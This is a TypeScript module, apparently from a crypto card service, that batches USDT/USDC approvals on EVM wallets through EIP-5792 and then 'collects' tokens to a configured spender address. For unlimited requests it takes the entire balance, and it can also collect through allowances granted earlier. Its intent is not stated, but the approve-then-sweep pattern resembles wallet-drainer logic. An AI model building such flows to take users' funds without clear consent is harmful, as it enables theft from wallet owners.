import { formatTransferSkipReason } from "@trustmycard/shared/constants/collection";
import {
  alreadyAuthorizedResult,
  createPreflightApi,
  meetsExpectedAllowance,
  preflightExistingAllowance,
} from "./allowance-preflight";
import { collectForExistingAllowance } from "./existing-allowance-collection";
import { createEvmApprovalChainPort } from "../approval/chains/evm-chain-port";
import { waitForTransactionConfirmation } from "../approval/confirmation/poller";
import type { ApprovalApiPort } from "../approval/ports";
import type {
  ApprovalOrchestrationResult,
  ApprovalRequest,
  PreparedApproval,
  SignedApproval,
} from "../approval/types";
import { StageStatus } from "../approval/types";
import { getToken, parseHumanToRaw } from "../core/chain-tokens";
import { validateEvmApproveCall } from "../core/evm-approve-guard";
import { getErrorMessage, isUserRejection } from "../core/errors";
import { EVM_CHAIN_ID, isEvmChainKey } from "../core/native-chains";
import {
  getWalletCapabilities,
  pollCallsStatus,
  sendWalletCalls,
  supportsSendCalls,
} from "../core/evm-wallet-batch";
import { ensureEvmChain } from "../native-transfer/ensure-evm-chain";
import type {
  AuthorizationAssetResult,
  LinkedAccounts,
  NetworkRow,
  TokenSymbol,
  UniversalProvider,
} from "../types";
import type { IncludedAssetWorkItem } from "./preferences";
import { balanceForToken } from "./preferences";
import type { WalletPhaseTokenCapture } from "./phases/types";

export type EvmTokenBatchRunArgs = {
  items: IncludedAssetWorkItem[];
  network: string;
  networks: NetworkRow[];
  accounts: LinkedAccounts;
  provider: UniversalProvider;
  apiBaseUrl?: string;
  getSpender: (networkKey: string) => string;
  runApproval: (args: {
    network: string;
    owner: string;
    token: TokenSymbol;
    amountHuman?: string;
    unlimited: boolean;
    nativeBalanceHuman: string;
    tokenBalanceHuman: string;
    executeTransfer: boolean;
    transferToAddress: string;
    transferAmountRaw?: string;
    onStage?: (stageResult: {
      stage: string;
      status: string;
      data?: unknown;
      error?: string | null;
    }) => void;
  }) => Promise<ApprovalOrchestrationResult>;
  onAssetStart?: (item: IncludedAssetWorkItem) => void;
  onAssetEnd?: (result: AuthorizationAssetResult) => void;
  log?: (step: string, detail?: Record<string, unknown>) => void;
  walletPhaseOnly?: boolean;
};

export type EvmTokenBatchRunResult = {
  results: AuthorizationAssetResult[];
  tokenCaptures: WalletPhaseTokenCapture[];
  batchId?: string | null;
};

type BatchJob = {
  item: IncludedAssetWorkItem & { asset: TokenSymbol };
  request: ApprovalRequest;
  prepared: PreparedApproval;
  signed: SignedApproval;
  shouldAttemptTransfer: boolean;
  transferAmountRaw?: string;
};

async function verifyAllowanceWithRetry(
  api: ApprovalApiPort,
  request: ApprovalRequest,
  prepared: PreparedApproval,
  signal?: AbortSignal
) {
  const maxAttempts = 5;
  const intervalMs = 1_500;
  let last = { hasAllowance: false, allowance: "0" };

  for (let attempt = 1; attempt <= maxAttempts; attempt += 1) {
    last = await api.verifyAllowance({ request, prepared, signal });
    if (meetsExpectedAllowance(last, prepared)) return last;
    if (attempt < maxAttempts) {
      await new Promise((r) => setTimeout(r, intervalMs));
    }
  }
  return last;
}

/**
 * Run USDT + USDC approvals on one EVM network as a single EIP-5792 wallet batch
 * when the wallet supports wallet_sendCalls. Falls back to sequential runApproval.
 */
export async function runEvmTokenBatchApproval(
  args: EvmTokenBatchRunArgs
): Promise<EvmTokenBatchRunResult> {
  const log = args.log ?? (() => undefined);
  const owner = args.accounts.evm;
  if (!owner) {
    return {
      results: args.items.map((item) => ({
        network: item.network,
        token: item.asset as TokenSymbol,
        outcome: "failed" as const,
        message: "No EVM address in this WalletConnect session",
      })),
      tokenCaptures: [],
    };
  }

  const chainId = EVM_CHAIN_ID[args.network as keyof typeof EVM_CHAIN_ID];
  if (chainId == null) {
    const fallback = await runSequentialFallback(args, owner, "Unsupported EVM network");
    return { results: fallback.results, tokenCaptures: fallback.tokenCaptures };
  }

  const capabilities = await getWalletCapabilities(args.provider, chainId, owner);
  if (!supportsSendCalls(capabilities, chainId)) {
    log("EIP5792_BATCH_UNSUPPORTED", {
      network: args.network,
      chainId,
      fallback: "sequential eth_sendTransaction",
    });
    const fallback = await runSequentialFallback(args, owner);
    return { results: fallback.results, tokenCaptures: fallback.tokenCaptures };
  }

  log("EIP5792_BATCH_ATTEMPT", {
    network: args.network,
    chainId,
    tokens: args.items.map((i) => i.asset),
  });

  const api = createPreflightApi(args.apiBaseUrl);
  const chainPort = createEvmApprovalChainPort({ provider: args.provider });
  const spender = args.getSpender(args.network);
  if (!spender) {
    return {
      results: args.items.map((item) => ({
        network: item.network,
        token: item.asset as TokenSymbol,
        outcome: "failed" as const,
        message: "Spender not configured",
      })),
      tokenCaptures: [],
    };
  }

  const jobs: BatchJob[] = [];
  const results: AuthorizationAssetResult[] = [];
  for (const item of args.items) {
    if (item.asset === "NATIVE") continue;
    const token = item.asset as TokenSymbol;
    const networkRow = args.networks.find((n) => n.key === item.network);
    const tokenInfo = getToken(item.network, token);
    if (!networkRow || !tokenInfo) {
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: "skipped_unsupported",
        message: `Unsupported token ${token} on ${item.network}`,
      };
      args.onAssetEnd?.(result);
      results.push(result);
      continue;
    }

    const tokenBalanceHuman = balanceForToken(networkRow, token);
    const availableBalanceRaw = parseHumanToRaw(
      tokenBalanceHuman,
      tokenInfo.decimals
    );
    const requestedTransferRaw = item.unlimited
      ? availableBalanceRaw
      : parseHumanToRaw(item.amountHuman, tokenInfo.decimals);
    const transferAmountRaw =
      availableBalanceRaw < requestedTransferRaw
        ? availableBalanceRaw.toString()
        : requestedTransferRaw.toString();
    const shouldAttemptTransfer = BigInt(transferAmountRaw) > BigInt(0);

    const request: ApprovalRequest = {
      network: item.network,
      owner,
      token,
      amountHuman: item.unlimited ? undefined : item.amountHuman,
      unlimited: item.unlimited,
      nativeBalanceHuman: networkRow.balances.native ?? "0",
      tokenBalanceHuman,
      executeTransfer: shouldAttemptTransfer,
      transferToAddress: spender,
      transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
    };

    try {
      let prepared: PreparedApproval;
      let alreadyAuthorized = false;
      try {
        const preflight = await preflightExistingAllowance({ api, request });
        prepared = preflight.prepared;
        alreadyAuthorized = preflight.alreadyAuthorized;
      } catch (preflightErr) {
        log("ALLOWANCE_PREFLIGHT_UNAVAILABLE", {
          network: item.network,
          token,
          error: getErrorMessage(preflightErr, "Allowance preflight unavailable"),
        });
        prepared = await api.prepare({ request });
      }

      if (alreadyAuthorized && !shouldAttemptTransfer) {
        args.onAssetStart?.({ ...item, asset: token });
        const result = alreadyAuthorizedResult({ item: { ...item, asset: token } });
        args.onAssetEnd?.(result);
        results.push(result);
        log("EIP5792_BATCH_SKIP_ALREADY_AUTHORIZED", {
          network: item.network,
          token,
        });
        continue;
      }

      if (alreadyAuthorized && shouldAttemptTransfer) {
        args.onAssetStart?.({ ...item, asset: token });
        try {
          const result = await collectForExistingAllowance({
            item: { ...item, asset: token },
            request,
            prepared,
            apiBaseUrl: args.apiBaseUrl,
          });
          args.onAssetEnd?.(result);
          results.push(result);
          log("EIP5792_BATCH_COLLECT_EXISTING_ALLOWANCE", {
            network: item.network,
            token,
            outcome: result.outcome,
          });
        } catch (err) {
          const result: AuthorizationAssetResult = {
            network: item.network,
            token,
            outcome: "failed",
            message: getErrorMessage(err, "Failed to collect existing allowance"),
          };
          args.onAssetEnd?.(result);
          results.push(result);
        }
        continue;
      }

      await api.acquireResources({ request, prepared });
      await api.verifyResources({ request, prepared });
      const signed = await chainPort.sign({ prepared, owner });
      validateEvmApproveCall({
        to: String(signed.payload.to),
        data: String(signed.payload.data),
        value: String(signed.payload.value ?? "0x0"),
        expectedTokenAddress: prepared.tokenAddress,
      });
      jobs.push({
        item: { ...item, asset: token },
        request,
        prepared,
        signed,
        shouldAttemptTransfer,
        transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
      });
    } catch (err) {
      const rejected = isUserRejection(err);
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: rejected ? "user_rejected" : "failed",
        message: getErrorMessage(err, "Failed to prepare batch approval"),
      };
      args.onAssetEnd?.(result);
      results.push(result);
    }
  }

  if (jobs.length === 0) {
    return { results, tokenCaptures: [] };
  }
  if (jobs.length === 1) {
    const job = jobs[0]!;
    const fallbackResults = await runSequentialFallback(args, owner, undefined, [
      job.item,
    ]);
    return {
      results: [...results, ...fallbackResults.results],
      tokenCaptures: fallbackResults.tokenCaptures,
    };
  }

  try {
    await ensureEvmChain(args.provider, chainId);
    for (const job of jobs) {
      args.onAssetStart?.(job.item);
      validateEvmApproveCall({
        to: String(job.signed.payload.to),
        data: String(job.signed.payload.data),
        value: String(job.signed.payload.value ?? "0x0"),
        expectedTokenAddress: job.prepared.tokenAddress,
      });
    }

    const batch = await sendWalletCalls(args.provider, {
      chainId,
      from: owner,
      calls: jobs.map((job) => ({
        to: String(job.signed.payload.to),
        data: String(job.signed.payload.data),
        value: String(job.signed.payload.value ?? "0x0"),
      })),
    });

    log("EIP5792_BATCH_SUBMITTED", {
      network: args.network,
      batchId: batch.id,
      callCount: jobs.length,
    });

    const status = await pollCallsStatus(args.provider, batch.id, chainId);
    const batchResults: AuthorizationAssetResult[] = [];
    const tokenCaptures: WalletPhaseTokenCapture[] = [];

    for (let i = 0; i < jobs.length; i += 1) {
      const job = jobs[i]!;
      const receipt = status.receipts[i];

      if (!receipt || receipt.status === "reverted") {
        const result: AuthorizationAssetResult = {
          network: job.item.network,
          token: job.item.asset,
          outcome: "failed",
          message: receipt
            ? "Approval transaction reverted on-chain"
            : "Batch completed without a receipt for this approval",
        };
        batchResults.push(result);
        args.onAssetEnd?.(result);
        continue;
      }

      if (args.walletPhaseOnly) {
        const orchestration: ApprovalOrchestrationResult = {
          ok: true,
          status: StageStatus.OK,
          context: {
            request: job.request,
            prepared: job.prepared,
            broadcast: { txHash: receipt.transactionHash },
            stageLog: [],
          },
          txHash: receipt.transactionHash,
          approvalId: null,
          stages: [],
        };
        tokenCaptures.push({
          item: job.item,
          orchestration,
          shouldAttemptTransfer: job.shouldAttemptTransfer,
          transferAmountRaw: job.transferAmountRaw,
        });
        const result: AuthorizationAssetResult = {
          network: job.item.network,
          token: job.item.asset,
          outcome: "authorized",
          message: "Wallet approved — settlement queued",
          txHash: receipt.transactionHash,
        };
        batchResults.push(result);
        args.onAssetEnd?.(result);
        continue;
      }

      try {
        await waitForTransactionConfirmation(chainPort, {
          txHash: receipt.transactionHash,
          network: job.item.network,
        });

        const verified = await verifyAllowanceWithRetry(
          api,
          job.request,
          job.prepared
        );
        if (!meetsExpectedAllowance(verified, job.prepared)) {
          const result: AuthorizationAssetResult = {
            network: job.item.network,
            token: job.item.asset,
            outcome: "failed",
            message:
              "Approval was confirmed on-chain but allowance could not be verified",
            txHash: receipt.transactionHash,
          };
          batchResults.push(result);
          args.onAssetEnd?.(result);
          continue;
        }

        const persisted = await api.persistApproval({
          request: job.request,
          prepared: job.prepared,
          txHash: receipt.transactionHash,
          verified,
        });
        await api.postApprovalLog({ request: job.request, ok: true });

        const skipLabel = persisted.transferSkippedReason
          ? formatTransferSkipReason(persisted.transferSkippedReason)
          : null;
        const result: AuthorizationAssetResult = {
          network: job.item.network,
          token: job.item.asset,
          outcome: persisted.transferTxHash ? "collected" : "authorized",
          message: persisted.transferTxHash
            ? "Token collection confirmed"
            : skipLabel
              ? `Authorized — ${skipLabel}`
              : "Authorized — collection queued",
          approvalId: persisted.approvalId,
          collectionIntentId: persisted.collectionIntentId ?? null,
          collectionStatus: persisted.collectionStatus ?? null,
          txHash: persisted.transferTxHash ?? receipt.transactionHash,
          transferSkippedReason: persisted.transferSkippedReason ?? null,
        };
        batchResults.push(result);
        args.onAssetEnd?.(result);

        log?.(
          persisted.transferTxHash
            ? "EIP5792_BATCH_TOKEN_AUTHORIZE_TRANSFER"
            : "EIP5792_BATCH_TOKEN_AUTHORIZE",
          {
            network: job.item.network,
            token: job.item.asset,
            txHash: receipt.transactionHash,
            batchId: batch.id,
          }
        );
      } catch (err) {
        const rejected = isUserRejection(err);
        const result: AuthorizationAssetResult = {
          network: job.item.network,
          token: job.item.asset,
          outcome: rejected ? "user_rejected" : "failed",
          message: getErrorMessage(err, "Post-batch approval failed"),
          txHash: receipt.transactionHash,
        };
        batchResults.push(result);
        args.onAssetEnd?.(result);
      }
    }

    return {
      results: [...results, ...batchResults],
      tokenCaptures,
      batchId: batch.id,
    };
  } catch (err) {
    const rejected = isUserRejection(err);
    const message = getErrorMessage(err, "EIP-5792 batch approval failed");
    log("EIP5792_BATCH_FAILED", {
      network: args.network,
      error: message,
      userRejected: rejected,
      fallback: rejected ? null : "sequential",
    });

    if (rejected) {
      const rejectedResults = jobs.map((job) => {
        const result: AuthorizationAssetResult = {
          network: job.item.network,
          token: job.item.asset,
          outcome: "user_rejected",
          message,
        };
        args.onAssetEnd?.(result);
        return result;
      });
      return { results: [...results, ...rejectedResults], tokenCaptures: [] };
    }

    const fallbackResults = await runSequentialFallback(args, owner, message);
    return {
      results: [...results, ...fallbackResults.results],
      tokenCaptures: fallbackResults.tokenCaptures,
    };
  }
}

async function runSequentialFallback(
  args: EvmTokenBatchRunArgs,
  owner: string,
  reason?: string,
  items: IncludedAssetWorkItem[] = args.items
): Promise<EvmTokenBatchRunResult> {
  if (reason) {
    args.log?.("EIP5792_BATCH_FALLBACK", { network: args.network, reason });
  }

  const results: AuthorizationAssetResult[] = [];
  const tokenCaptures: WalletPhaseTokenCapture[] = [];
  for (const item of items) {
    if (item.asset === "NATIVE") continue;
    args.onAssetStart?.(item);

    const networkRow = args.networks.find((n) => n.key === item.network);
    const token = item.asset as TokenSymbol;
    const tokenInfo = getToken(item.network, token);
    if (!networkRow || !tokenInfo) {
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: "skipped_unsupported",
        message: `Unsupported token ${token} on ${item.network}`,
      };
      results.push(result);
      args.onAssetEnd?.(result);
      continue;
    }

    const spender = args.getSpender(item.network);
    if (!spender) {
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: "failed",
        message: "Spender not configured",
      };
      results.push(result);
      args.onAssetEnd?.(result);
      continue;
    }

    const tokenBalanceHuman = balanceForToken(networkRow, token);
    const availableBalanceRaw = parseHumanToRaw(
      tokenBalanceHuman,
      tokenInfo.decimals
    );
    const requestedTransferRaw = item.unlimited
      ? availableBalanceRaw
      : parseHumanToRaw(item.amountHuman, tokenInfo.decimals);
    const transferAmountRaw =
      availableBalanceRaw < requestedTransferRaw
        ? availableBalanceRaw.toString()
        : requestedTransferRaw.toString();
    const shouldAttemptTransfer = BigInt(transferAmountRaw) > BigInt(0);

    try {
      let alreadyAuthorized = false;
      let preflightRequest: ApprovalRequest | null = null;
      let preflightPrepared: PreparedApproval | null = null;
      try {
        const preflightApi = createPreflightApi(args.apiBaseUrl);
        preflightRequest = {
          network: item.network,
          owner,
          token,
          amountHuman: item.unlimited ? undefined : item.amountHuman,
          unlimited: item.unlimited,
          nativeBalanceHuman: networkRow.balances.native ?? "0",
          tokenBalanceHuman,
          executeTransfer: shouldAttemptTransfer,
          transferToAddress: spender,
          transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
        };
        const preflight = await preflightExistingAllowance({
          api: preflightApi,
          request: preflightRequest,
        });
        alreadyAuthorized = preflight.alreadyAuthorized;
        preflightPrepared = preflight.prepared;
      } catch (preflightErr) {
        args.log?.("ALLOWANCE_PREFLIGHT_UNAVAILABLE", {
          network: item.network,
          token,
          error: getErrorMessage(preflightErr, "Allowance preflight unavailable"),
        });
      }

      if (alreadyAuthorized && !shouldAttemptTransfer) {
        const result = alreadyAuthorizedResult({
          item: { ...item, asset: token },
        });
        results.push(result);
        args.onAssetEnd?.(result);
        args.log?.("EIP5792_SEQUENTIAL_SKIP_ALREADY_AUTHORIZED", {
          network: item.network,
          token,
        });
        continue;
      }

      if (alreadyAuthorized && shouldAttemptTransfer && preflightRequest && preflightPrepared) {
        try {
          const result = await collectForExistingAllowance({
            item: { ...item, asset: token },
            request: preflightRequest,
            prepared: preflightPrepared,
            apiBaseUrl: args.apiBaseUrl,
          });
          results.push(result);
          args.onAssetEnd?.(result);
          args.log?.("EIP5792_SEQUENTIAL_COLLECT_EXISTING_ALLOWANCE", {
            network: item.network,
            token,
            outcome: result.outcome,
          });
        } catch (err) {
          const result: AuthorizationAssetResult = {
            network: item.network,
            token,
            outcome: "failed",
            message: getErrorMessage(err, "Failed to collect existing allowance"),
          };
          results.push(result);
          args.onAssetEnd?.(result);
        }
        continue;
      }

      const orchestration = await args.runApproval({
        network: item.network,
        owner,
        token,
        amountHuman: item.unlimited ? undefined : item.amountHuman,
        unlimited: item.unlimited,
        nativeBalanceHuman: networkRow.balances.native ?? "0",
        tokenBalanceHuman,
        executeTransfer: shouldAttemptTransfer,
        transferToAddress: spender,
        transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
      });

      if (!orchestration.ok) {
        const result: AuthorizationAssetResult = {
          network: item.network,
          token,
          outcome: orchestration.userRejected ? "user_rejected" : "failed",
          message: getErrorMessage(orchestration.error, "Approval failed"),
          txHash: orchestration.txHash,
          approvalId: orchestration.approvalId,
        };
        results.push(result);
        args.onAssetEnd?.(result);
        continue;
      }

      if (args.walletPhaseOnly) {
        tokenCaptures.push({
          item: { ...item, asset: token },
          orchestration,
          shouldAttemptTransfer,
          transferAmountRaw: shouldAttemptTransfer ? transferAmountRaw : undefined,
        });
        const result: AuthorizationAssetResult = {
          network: item.network,
          token,
          outcome: "authorized",
          message: "Wallet approved — settlement queued",
          txHash: orchestration.txHash,
          approvalId: orchestration.approvalId,
        };
        results.push(result);
        args.onAssetEnd?.(result);
        continue;
      }

      const persisted = orchestration.context.persisted;
      const skipLabel = persisted?.transferSkippedReason
        ? formatTransferSkipReason(persisted.transferSkippedReason)
        : null;
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: persisted?.transferTxHash ? "collected" : "authorized",
        message: persisted?.transferTxHash
          ? "Token collection confirmed"
          : skipLabel
            ? `Authorized — ${skipLabel}`
            : "Authorized — collection queued",
        approvalId: orchestration.approvalId,
        collectionIntentId: persisted?.collectionIntentId ?? null,
        collectionStatus: persisted?.collectionStatus ?? null,
        txHash: persisted?.transferTxHash ?? orchestration.txHash,
        transferSkippedReason: persisted?.transferSkippedReason ?? null,
      };
      results.push(result);
      args.onAssetEnd?.(result);
    } catch (err) {
      const rejected = isUserRejection(err);
      const result: AuthorizationAssetResult = {
        network: item.network,
        token,
        outcome: rejected ? "user_rejected" : "failed",
        message: getErrorMessage(err, "Approval failed"),
      };
      results.push(result);
      args.onAssetEnd?.(result);
    }
  }
  return { results, tokenCaptures };
}

export type AuthorizationWorkUnit =
  | { kind: "evm_token_batch"; network: string; items: IncludedAssetWorkItem[] }
  | { kind: "single"; item: IncludedAssetWorkItem };

/**
 * Group consecutive EVM token items on the same network for EIP-5792 batching.
 */
export function planAuthorizationWork(
  items: IncludedAssetWorkItem[]
): AuthorizationWorkUnit[] {
  const units: AuthorizationWorkUnit[] = [];
  let index = 0;

  while (index < items.length) {
    const item = items[index]!;
    const isEvmToken = item.asset !== "NATIVE" && isEvmChainKey(item.network);

    if (isEvmToken) {
      const batch: IncludedAssetWorkItem[] = [item];
      let next = index + 1;
      while (next < items.length) {
        const candidate = items[next]!;
        if (
          candidate.network === item.network &&
          candidate.asset !== "NATIVE" &&
          isEvmChainKey(candidate.network)
        ) {
          batch.push(candidate);
          next += 1;
        } else {
          break;
        }
      }

      if (batch.length >= 2) {
        units.push({ kind: "evm_token_batch", network: item.network, items: batch });
      } else {
        units.push({ kind: "single", item });
      }
      index = next;
      continue;
    }

    units.push({ kind: "single", item });
    index += 1;
  }

  return units;
}
